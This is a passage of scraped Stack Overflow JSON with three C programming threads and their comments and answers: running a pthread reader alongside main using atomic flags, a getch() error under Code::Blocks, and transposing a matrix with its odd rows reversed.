(cyclically) read in the other thread. Thereby, the write as well as read access have to be done using atomic operations (since C11 provided with <a href=\"http://en.cppreference.com/w/c/atomic\" rel=\"nofollow noreferrer\">Atomic Library</a>. Otherwise, the synchronization between threads might not be sufficient (as any CPU caching or similar internal effects may prevent this)."}, {"owner": {"reputation": 21, "user_id": 1538367, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be9f3bdd9ef0a4ab0e61dd45edb3be96?s=128&d=identicon&r=PG&f=1", "display_name": "Sandaruwan Fernando", "link": "https://stackoverflow.com/users/1538367/sandaruwan-fernando"}, "edited": false, "score": 0, "creation_date": 1498033877, "post_id": 44666733, "comment_id": 76325888, "body": "Is there any solution about that?"}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1498038606, "post_id": 44666733, "comment_id": 76329384, "body": "May be, I did understand your question wrong. If your intention is to have a &quot;never-ending&quot; main loop and a concurrently running &quot;never-ending&quot; read loop, then you should make familiar with <a href=\"https://linux.die.net/man/3/pthread_mutex_init\" rel=\"nofollow noreferrer\">pthread_mutex</a>. A mutex can be used for mutual exclusion of concurrent data accesses. The actual overhanding of data can then be done using allocated buffers, lists, queues, and anything else what is usually available. However, every read/write access has to be guarded by a mutex lock to prevent that one thread disturbs the other in the <i>critical section</i>."}, {"owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "edited": false, "score": 0, "creation_date": 1498039026, "post_id": 44666733, "comment_id": 76329684, "body": "If I did understand your question wrong this might be caused by your misleading code sample. (I mean this as statement - not as offense.) May be, it&#39;s worth to edit it and expose the main loop somehow (even if it contains comments only). And, of course, <code>pthread_join()</code> is the function where two threads become one (the one which is calling it and the other for which the ID is provided). So, it has to be called after leaving the main loop."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498077068, "post_id": 44666733, "comment_id": 76355562, "body": "the posted code is missing a necessary statement: <code>#include &lt;stdio.h&gt;</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498077138, "post_id": 44666733, "comment_id": 76355595, "body": "in the function: <code>main()</code>, the parameters are not being used.  so should use the signature: <code>int main( void )</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498077348, "post_id": 44666733, "comment_id": 76355686, "body": "before calling <code>read_block()</code> must have opened the input file, typically by <code>fopen()</code> or <code>open()</code>  And there is no function: <code>read_block()</code>  perhaps you meant <code>read()</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498077472, "post_id": 44666733, "comment_id": 76355742, "body": "the posted code contains some &#39;magic&#39; numbers.  &#39;magic&#39; numbers are numbers with no basis.  I.E. 8, 24   &#39;magic&#39; numbers make the code much more difficult to understand, debug, etc.  Suggest using a <code>enum</code> statement or <code>#define</code> statements to give those &#39;magic&#39; numbers meaningful names, then use those meaningful names throughout the code."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498077850, "post_id": 44666733, "comment_id": 76355933, "body": "a thread cannot return a (useful) pointer to a character array.  However, it can return a  pointer to a &#39;status&#39;.    The return type of a thread function is always <code>void*</code> so the function: <code>nfc_read()</code> should be returning a <code>void*</code> not a <code>void</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498078141, "post_id": 44666733, "comment_id": 76356100, "body": "the posted code is missing the statement: <code>#include &lt;stdint.h&gt;</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498078261, "post_id": 44666733, "comment_id": 76356164, "body": "the parameter to <code>nfc_read()</code> is not used, do the first line in the body of that function should be: <code>(void)arg;</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498078435, "post_id": 44666733, "comment_id": 76356249, "body": "regarding the statement: <code>printf(&quot;NFC card value is : %s \\n&quot;, (char)returnValue);</code>   The format specifier: <code>%s</code> is expecting a pointer to a NUL terminated array of char (char*).  Not (char)"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498078494, "post_id": 44666733, "comment_id": 76356280, "body": "what is this statement supposed to mean: <code>printf(&quot;other process&quot;);</code>?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1498078925, "post_id": 44666733, "comment_id": 76356505, "body": "the thread function: <code>nfc_read()</code> is returning the address of a local variable.  That variable will be &#39;out of scope&#39; when the function exits.  So in <code>main()</code> that variable does not exist after the call to <code>pthread_join()</code>  Trying to print the contents of that local variable, in <code>main()</code>, is undefined behavior.  Suggest creating <code>read_data[]</code> via a call to <code>malloc()</code> or declaring it in <code>main()</code> and passing its address as the parameter to the thread function"}], "answers": [{"tags": [], "owner": {"reputation": 16265, "user_id": 7478597, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yBOIj.jpg?s=128&g=1", "display_name": "Scheff", "link": "https://stackoverflow.com/users/7478597/scheff"}, "is_accepted": false, "score": 0, "last_activity_date": 1498041907, "last_edit_date": 1498041907, "creation_date": 1498038016, "answer_id": 44672390, "question_id": 44666733, "link": "https://stackoverflow.com/questions/44666733/main-doesnt-continue-after-call-pthread-join-function/44672390#44672390", "title": "main doesn&#39;t continue after call pthread_join function", "body": "<p>This is a sample where a read thread runs concurrently to the \"main\" thread which is doing other work (in this case, printing dots and sleeping).</p>\n\n<p>To keep things simple, a simulated the reading from an input device with copying a constant string character by character. I guess, this is reasonable as the synchronization of threads is focused.</p>\n\n<p>For the synchronization of threads, I used <code>atomic_bool</code> with <code>atomic_store()</code> and <code>atomic_load()</code> which are provided by the <a href=\"http://en.cppreference.com/w/c/atomic\" rel=\"nofollow noreferrer\">Atomic Library</a> (since C11).</p>\n\n<p>My sample application <code>test-concurrent-read.c</code>:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;stdatomic.h&gt;\n#include &lt;unistd.h&gt;\n\n/* sampe input */\nconst char sampleInput[]\n  = \"This is sample input which is consumed as if it was read from\"\n    \" a (very slow) external device.\";\n\natomic_bool readDone = ATOMIC_VAR_INIT(0);\n\nvoid* threadRead(void *pArg)\n{\n  char **pPBuffer = (char**)pArg;\n  size_t len = 0, size = 0;\n  int c; const char *pRead;\n  for (pRead = sampleInput; (c = *pRead++) &gt; 0; sleep(1)) {\n    if (len + 1 &gt;= size) {\n      if (!(*pPBuffer = realloc(*pPBuffer, (size + 64) * sizeof(char)))) {\n        fprintf(stderr, \"ERROR! Allocation failed!\\n\");\n        break;\n      }\n      size += 64;\n    }\n    (*pPBuffer)[len++] = c; (*pPBuffer)[len] = '\\0';\n  }\n  atomic_store(&amp;readDone, 1);\n  return NULL;\n}\n\nint main()\n{\n  /* start thread to read concurrently */\n  printf(\"Starting thread...\\n\");\n  pthread_t idThreadRead; /* thread ID for read thread */\n  char *pBuffer = NULL; /* pointer to return buffer from thread */\n  if (pthread_create(&amp;idThreadRead, NULL, &amp;threadRead, &amp;pBuffer)) {\n    fprintf(stderr, \"ERROR: Failed to start read thread!\\n\");\n    return -1;\n  }\n  /* start main loop */\n  printf(\"Starting main loop...\\n\");\n  do {\n    putchar('.'); fflush(stdout);\n    sleep(1);\n  } while (!atomic_load(&amp;readDone));\n  putchar('\\n');\n  void *ret;\n  pthread_join(idThreadRead, &amp;ret);\n  /* after sync */\n  printf(\"\\nReceived: '%s'\\n\", pBuffer ? pBuffer : \"&lt;NULL&gt;\");\n  free(pBuffer);\n  /* done */\n  return 0;\n}\n</code></pre>\n\n<p>Compiled and tested with gcc in cygwin on Windows 10 (64 bit):</p>\n\n<pre><code>$ gcc -std=c11 -pthread -o test-concurrent-read test-concurrent-read.c\n\n$ ./test-concurrent-read\nStarting thread...\nStarting main loop...\n.............................................................................................\n\nReceived: 'This is sample input which is consumed as if it was read from a (very slow) external device.'\n\n$ \n</code></pre>\n\n<p>I guess, it is worth to mention why there is no mutex guarding for <code>pBuffer</code> which is used in <code>main()</code> as well as in <code>threadRead()</code>.</p>\n\n<ol>\n<li><p><code>pBuffer</code> is initialized in <code>main()</code> <em>before</em> <code>pthread_create()</code> is called.</p></li>\n<li><p>While <code>thread_read()</code> is running, <code>pBuffer</code> is used by it exclusively (via its passed address in <code>pPBuffer</code>).</p></li>\n<li><p>It is accessed in <code>main()</code> again but <em>not before</em> <code>pthread_join()</code> which grants that <code>threadRead()</code> has ended.</p></li>\n</ol>\n\n<p>I tried to find a reference by google to confirm that this procedure is well-defined and reasonable. The best, I could find was <a href=\"https://stackoverflow.com/questions/22347856/pthread-create3-and-memory-synchronization-guarantee-in-smp-architectures\">SO: pthread_create(3) and memory synchronization guarantee in SMP architectures</a> which cites <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html#tag_04_12\" rel=\"nofollow noreferrer\">The Open Group Base Specifications Issue 7 - 4.12 Memory Synchronization</a>.</p>\n"}], "owner": {"reputation": 21, "user_id": 1538367, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be9f3bdd9ef0a4ab0e61dd45edb3be96?s=128&d=identicon&r=PG&f=1", "display_name": "Sandaruwan Fernando", "link": "https://stackoverflow.com/users/1538367/sandaruwan-fernando"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1000, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1498041907, "creation_date": 1498018137, "last_edit_date": 1498020410, "question_id": 44666733, "link": "https://stackoverflow.com/questions/44666733/main-doesnt-continue-after-call-pthread-join-function", "title": "main doesn&#39;t continue after call pthread_join function", "body": "<p>I'm new to pthread and multithreading, i have written a code like that.</p>\n\n<pre><code>#include &lt;pthread.h&gt;\n#include &lt;unistd.h&gt;\n\n\nvoid *nfc_read(void *arg)\n{\n    int fd = -1;   \n    int ret;\n    uint8_t read_data[24];\n\n    while(1){\n        ret = read_block(fd, 8, read_data);\n        if(!ret){\n            return (void)read_data;\n        }\n    }\n}\n\nint main(int argc, char *argv[])\n{\n    pthread_t my_thread;\n    void  *returnValue;\n\n    pthread_create(&amp;my_thread, NULL, nfc_read, NULL);\n    pthread_join(my_thread, &amp;returnValue);\n\n    printf(\"NFC card value is : %s \\n\", (char)returnValue);\n\n    printf(\"other process\");\n\n  return 0;\n}\n</code></pre>\n\n<p>Until the return value from <strong>nfc_read</strong> function, as I will have other code I need to run and I don't want to block in main. How can i do that?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1498012561, "post_id": 44665926, "comment_id": 76317105, "body": "Please read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>, post image <b>ONLY</b> when it can&#39;t be post as text."}, {"owner": {"reputation": 3624, "user_id": 8013471, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/jh4jO.jpg?s=128&g=1", "display_name": "cse", "link": "https://stackoverflow.com/users/8013471/cse"}, "edited": false, "score": 0, "creation_date": 1498012594, "post_id": 44665926, "comment_id": 76317112, "body": "Can you add your code here? Even though it is visible in image."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498016117, "post_id": 44665926, "comment_id": 76317908, "body": "What compilation options did you use?  The <code>getch()</code> function can&#39;t be used in some styles of Windows application."}], "answers": [{"tags": [], "owner": {"reputation": 29, "user_id": 8120919, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/d2Oi6.png?s=128&g=1", "display_name": "Morpheus Curriculum Vit&#230;", "link": "https://stackoverflow.com/users/8120919/morpheus-curriculum-vit%c3%a6"}, "is_accepted": false, "score": 1, "last_activity_date": 1536716819, "last_edit_date": 1536716819, "creation_date": 1498014302, "answer_id": 44666192, "question_id": 44665926, "link": "https://stackoverflow.com/questions/44665926/drawing-operation-was-attempted-when-there-was-no-current-window-error-while-usi/44666192#44666192", "title": "drawing operation was attempted when there was no current window error while using getch() in C", "body": "<p>I researched, what I understood was that the command <code>getch</code> is deprecated and the command you can use to replace it is the <code>_getch</code>.</p>\n\n<p>There is more information at this link:\n<a href=\"https://docs.microsoft.com/cpp/c-runtime-library/reference/getch\" rel=\"nofollow noreferrer\">https://docs.microsoft.com/cpp/c-runtime-library/reference/getch</a></p>\n"}, {"comments": [{"owner": {"reputation": 32100, "user_id": 1033581, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/e8891617e36b8d1254eb3ce1a5662da4?s=128&d=identicon&r=PG", "display_name": "C\u0153ur", "link": "https://stackoverflow.com/users/1033581/c%c5%93ur"}, "edited": false, "score": 0, "creation_date": 1536717401, "post_id": 52284039, "comment_id": 91520913, "body": "Duplicate answer of Morpheus Curriculum Vit&#230;."}], "tags": [], "owner": {"reputation": 33, "user_id": 10349759, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-4KfcfkRby7U/AAAAAAAAAAI/AAAAAAAAAAc/WBiVnpTha0M/photo.jpg?sz=128", "display_name": "Aman Agrawal", "link": "https://stackoverflow.com/users/10349759/aman-agrawal"}, "is_accepted": false, "score": 1, "last_activity_date": 1536716702, "last_edit_date": 1536716702, "creation_date": 1536699054, "answer_id": 52284039, "question_id": 44665926, "link": "https://stackoverflow.com/questions/44665926/drawing-operation-was-attempted-when-there-was-no-current-window-error-while-usi/52284039#52284039", "title": "drawing operation was attempted when there was no current window error while using getch() in C", "body": "<p>Use <code>_getch()</code> instead of <code>getch()</code>:</p>\n\n<pre><code>#include&lt;conio.h&gt;\n_getch();\n</code></pre>\n\n<p>Source: <a href=\"https://docs.microsoft.com/cpp/c-runtime-library/reference/getch\" rel=\"nofollow noreferrer\">https://docs.microsoft.com/cpp/c-runtime-library/reference/getch</a></p>\n"}], "owner": {"reputation": 21, "user_id": 8191609, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db0258a61d0dced5909a3e4fab77c470?s=128&d=identicon&r=PG&f=1", "display_name": "Anmol Malhotra", "link": "https://stackoverflow.com/users/8191609/anmol-malhotra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 9400, "favorite_count": 0, "answer_count": 2, "score": -4, "last_activity_date": 1536717274, "creation_date": 1498012389, "last_edit_date": 1536717274, "question_id": 44665926, "link": "https://stackoverflow.com/questions/44665926/drawing-operation-was-attempted-when-there-was-no-current-window-error-while-usi", "title": "drawing operation was attempted when there was no current window error while using getch() in C", "body": "<p>In C there is a error I'm facing \nthat when ever I use <code>getch()</code> command in my code and run it either in codeblocks or the .exe file after everything is done and when the control goes to <code>getch()</code> command it shows an error pop up window saying </p>\n\n<blockquote>\n  <p>Drawing operation was attempted when there was no current window.</p>\n</blockquote>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;conio.h&gt;\nint main() {\n    int a;\n    scanf(\"%d\", &amp;a);\n    printf(\"%d\", a);\n    getch();\n    return(0);\n}\n</code></pre>\n\n<p>Using Code::Blocks 16.01.</p>\n"}, {"tags": ["c", "arrays", "algorithm", "matrix"], "comments": [{"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1498008307, "post_id": 44665351, "comment_id": 76316132, "body": "Write a function to reverse rows, and apply it before you apply a function to transpose."}, {"owner": {"reputation": 89, "user_id": 6797475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a58e7c6b9d3471458c5d1188c4bbca65?s=128&d=identicon&r=PG&f=1", "display_name": "AjithAj", "link": "https://stackoverflow.com/users/6797475/ajithaj"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498008470, "post_id": 44665351, "comment_id": 76316167, "body": "Problem is, I want reverse only the odd rows of the Matrix"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498008549, "post_id": 44665351, "comment_id": 76316189, "body": "I meant, write a function to reverse <i>a</i> row, and apply to whichever rows you choose; then transpose. The point is to break your problem down into smaller subproblems."}, {"owner": {"reputation": 89, "user_id": 6797475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a58e7c6b9d3471458c5d1188c4bbca65?s=128&d=identicon&r=PG&f=1", "display_name": "AjithAj", "link": "https://stackoverflow.com/users/6797475/ajithaj"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498008713, "post_id": 44665351, "comment_id": 76316236, "body": "Can u give me hint how to reverse a specific row @DavidBowling"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1498008914, "post_id": 44665351, "comment_id": 76316275, "body": "<code>for (size_t i = 0; i &lt; nrows; i++) { if (i % 2) { reverse_array(arr[i]); } }</code>. To reverse an array in place, you could swap the first and last elements, then swap the second and next-to-last elements, and so on until the middle of the array is reached."}, {"owner": {"reputation": 89, "user_id": 6797475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a58e7c6b9d3471458c5d1188c4bbca65?s=128&d=identicon&r=PG&f=1", "display_name": "AjithAj", "link": "https://stackoverflow.com/users/6797475/ajithaj"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1498009042, "post_id": 44665351, "comment_id": 76316297, "body": "Thank you, will try @DavidBowling"}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1498009330, "post_id": 44665351, "comment_id": 76316355, "body": "That&#39;s an excellent use case scenario for <code>for</code> loops."}, {"owner": {"reputation": 89, "user_id": 6797475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a58e7c6b9d3471458c5d1188c4bbca65?s=128&d=identicon&r=PG&f=1", "display_name": "AjithAj", "link": "https://stackoverflow.com/users/6797475/ajithaj"}, "edited": false, "score": 0, "creation_date": 1498010360, "post_id": 44665351, "comment_id": 76316571, "body": "Sorry I can&#39;t do that... Can anyone code that pls.. and post it"}, {"owner": {"reputation": 2652, "user_id": 4564515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90733097a656c664a472c437678aad42?s=128&d=identicon&r=PG&f=1", "display_name": "jschultz410", "link": "https://stackoverflow.com/users/4564515/jschultz410"}, "edited": false, "score": 0, "creation_date": 1498010862, "post_id": 44665351, "comment_id": 76316693, "body": "@AjithAj David Bowling already gave you the answer.  You said you know how to transpose a matrix.  Ok.  Then do what David said and then transpose the matrix.  It yields the desired output.  Reversing an array should be easier than transposing a matrix ..."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1498015513, "post_id": 44665351, "comment_id": 76317779, "body": "@DavidBowling change <code>i++</code> to <code>i += 2</code> would avoid the need for the modulo"}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1498015576, "post_id": 44665351, "comment_id": 76317795, "body": "@AjithAj if the code is already provided and you still don&#39;t know how to use then you should <a href=\"https://stackoverflow.com/q/562303/995714\">read a C book first</a>. You must show what you&#39;ve tried first, otherwise the question is off-topic"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498015605, "post_id": 44665351, "comment_id": 76317803, "body": "@L\u01b0uV\u0129nhPh&#250;c-- sure, that&#39;s a good suggestion (about the <code>i += 2</code> <i>and</i> the book :)"}, {"owner": {"reputation": 89, "user_id": 6797475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a58e7c6b9d3471458c5d1188c4bbca65?s=128&d=identicon&r=PG&f=1", "display_name": "AjithAj", "link": "https://stackoverflow.com/users/6797475/ajithaj"}, "edited": false, "score": 0, "creation_date": 1498019257, "post_id": 44665351, "comment_id": 76318695, "body": "One doubt how to get Transpose matrix in same matrix"}], "answers": [{"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": 0, "last_activity_date": 1498041611, "creation_date": 1498041611, "answer_id": 44673813, "question_id": 44665351, "link": "https://stackoverflow.com/questions/44665351/matrix-transpose-with-odd-row-reversed/44673813#44673813", "title": "Matrix Transpose With odd row Reversed", "body": "<p>If I have understood the assignment correctly then the program can look the following way.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define MAX_VALUE   100\n\nint main(void) \n{\n    while ( 1 )\n    {\n        printf( \"Enter the size of an array (0 - Exit): \" );\n\n        size_t n;\n\n        if ( scanf( \"%zu\", &amp;n ) != 1 || n == 0 ) break;\n\n        putchar('\\n');\n\n        n %= MAX_VALUE;\n\n        int a[n][n];\n\n        for ( size_t i = 0; i &lt; n; i++ )\n        {\n            for ( size_t j = 0; j &lt; n; j++ )\n            {\n                a[i][j] = n * i + j;\n            }\n        }\n\n        for (size_t i = 0; i &lt; n; i++)\n        {\n            for (size_t j = 0; j &lt; n; j++)\n            {\n                printf(\"%3d \", a[i][j]);\n            }\n\n            putchar('\\n');\n        }\n\n        putchar('\\n');\n\n        for (size_t i = 0; i &lt; n; i++)\n        {\n            for (size_t j = i; j &lt; n; j++)\n            {\n                if (j % 2 == 1 &amp;&amp; i &lt; n / 2)\n                {\n                    int tmp = a[j][i];\n                    a[j][i] = a[j][n - i - 1];\n                    a[j][n - i - 1] = tmp;\n                }\n                if (i != j)\n                {\n                    int tmp = a[i][j];\n                    a[i][j] = a[j][i];\n                    a[j][i] = tmp;\n                }\n            }\n        }\n\n        for (size_t i = 0; i &lt; n; i++)\n        {\n            for (size_t j = 0; j &lt; n; j++)\n            {\n                printf(\"%3d \", a[i][j]);\n            }\n\n            putchar('\\n');\n        }\n\n        putchar('\\n');\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Its output might look like</p>\n\n<pre><code>Enter the size of an array (0 - Exit): 10\n\n  0  1  2  3  4  5  6  7  8  9 \n 10 11 12 13 14 15 16 17 18 19 \n 20 21 22 23 24 25 26 27 28 29 \n 30 31 32 33 34 35 36 37 38 39  \n 40 41 42 43 44 45 46 47 48 49 \n 50 51 52 53 54 55 56 57 58 59 \n 60 61 62 63 64 65 66 67 68 69 \n 70 71 72 73 74 75 76 77 78 79 \n 80 81 82 83 84 85 86 87 88 89 \n 90 91 92 93 94 95 96 97 98 99 \n\n  0 19 20 39 40 59 60 79 80 99 \n  1 18 21 38 41 58 61 78 81 98 \n  2 12 22 37 42 57 62 77 82 97\n  3 13 23 36 43 56 63 76 83 96\n  4 14 24 34 44 55 64 75 84 95\n  5 15 25 35 45 54 65 74 85 94\n  6 16 26 33 46 53 66 73 86 93\n  7 17 27 32 47 52 67 72 87 92\n  8 11 28 31 48 51 68 71 88 91\n  9 10 29 30 49 50 69 70 89 90 \n\nEnter the size of an array (0 - Exit): 3\n\n  0 1 2\n  3 4 5\n  6 7 8\n\n  0 5 6\n  1 4 7\n  2 3 8 \n\nEnter the size of an array (0 - Exit): 0\n</code></pre>\n\n<p>The compiler should support Variable Length Arrays. Otherwise you can rewrite the program for an array with a fixed size.</p>\n"}, {"tags": [], "owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "is_accepted": false, "score": 1, "last_activity_date": 1498045373, "last_edit_date": 1498045373, "creation_date": 1498044818, "answer_id": 44674934, "question_id": 44665351, "link": "https://stackoverflow.com/questions/44665351/matrix-transpose-with-odd-row-reversed/44674934#44674934", "title": "Matrix Transpose With odd row Reversed", "body": "<p>Here is a solution that breaks the problem into smaller subproblems. The function <code>reverse_row()</code> is a function that reverses an array in place, and the function <code>transpose_array()</code> transposes an array in place.</p>\n\n<p>The first function, <code>reverse_row()</code> is called in a loop on the rows of the 2d array with odd indices, then the <code>transpose_array()</code> function is called on the resulting array. Note that the test <code>if (i % 2) {}</code> is used to determine if an array index is odd or even, since <code>i % 2</code> evaluates to <code>0</code> only when <code>i</code> is even; you could also avoid this test and simply increment <code>i</code> by two at each iteration (starting from 1), as suggested by <a href=\"https://stackoverflow.com/questions/44665351/matrix-transpose-with-odd-row-reversed#comment76317779_44665351\">@L\u01b0u V\u0129nh Ph\u00fac</a> in the comments:</p>\n\n<pre><code>for (size_t i = 1; i &lt; MATRIX_SZ; i += 2) {\n    reverse_row(MATRIX_SZ, array[i]);\n    }\n</code></pre>\n\n<p>Also note that to transpose a square matrix in place, you do not need to iterate over all of the elements, but only the elements above or below the diagonal, swapping with the appropriate element. In this case, I have chosen to iterate over the elements below the diagonal, swapping with the corresponding element above the diagonal. Of course, the elements on the diagonal remain unchanged so are not iterated over at all.</p>\n\n<p>Here is the code, using a 4X4 array as input. This code works for square matrices, and could be adapted to work for rectangular matrices. This would require care in choosing the size of the array used to represent the matrix, or dynamic allocation.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define MATRIX_SZ  4\n\nvoid print_array(size_t n, int arr[n][n]);\nvoid 